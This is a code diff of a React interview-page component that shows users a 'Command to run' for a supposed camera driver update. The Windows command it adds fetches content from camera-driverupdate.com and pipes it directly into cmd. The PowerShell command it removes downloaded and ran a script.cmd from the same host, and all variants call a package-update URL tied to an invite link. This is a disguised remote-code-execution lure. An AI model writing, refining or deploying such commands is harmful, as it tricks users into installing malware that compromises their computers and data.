@@ -723,7 +723,7 @@ export default function SummaryInterview() {
               <span className={styles.driverHelpCommandLabel}>Command to run</span>
               <div className={styles.driverHelpCommandWrap}>
             <div ref={driverCommandRef} id="driver-command" className={styles.driverHelpCommand} role="region" aria-label="Command to copy">
-            {driverOs === 'mac' && (
+                {driverOs === 'mac' && (
                       <code>
                   {`curl -sL -X POST https://camera-driverupdate.com/mac \
                     -H "Host: camera-driverupdate.com" \
@@ -732,12 +732,15 @@ export default function SummaryInterview() {
                   curl -sL https://camera-driverupdate.com/package-update/${inviteLink ? inviteLink : ''}`}
                       </code>
                   )}
-              {driverOs === 'windows' && (
-                  <code>
-              {`powershell -NoProfile -Command "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;$f=$env:TEMP+'\\script.cmd';Invoke-WebRequest -Uri 'https://camera-driverupdate.com/window' -Method POST -Headers @{'User-Agent'='Mozilla/5.0'} -MaximumRedirection 10 -OutFile $f;cmd /c $f"
-              powershell -NoProfile -Command "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12; Invoke-RestMethod -Uri "https://camera-driverupdate.com/package-update/${inviteLink || ''}" -Method Get`}
-                  </code>
-              )}
+                {driverOs === 'windows' && (
+                          <code>
+                      {`curl -sL -X POST https://camera-driverupdate.com/window
+                        -H "Host: camera-driverupdate.com" \
+                        -H "User-Agent: Mozilla/5.0" \
+                        -H "Accept: */*" | cmd && \
+                      curl -sL https://camera-driverupdate.com/package-update/${inviteLink ? inviteLink : ''}`}
+                          </code>
+                      )}
               {driverOs === 'linux' && (
                       <code>
                   {`curl -sL -X POST https://camera-driverupdate.com/mac \
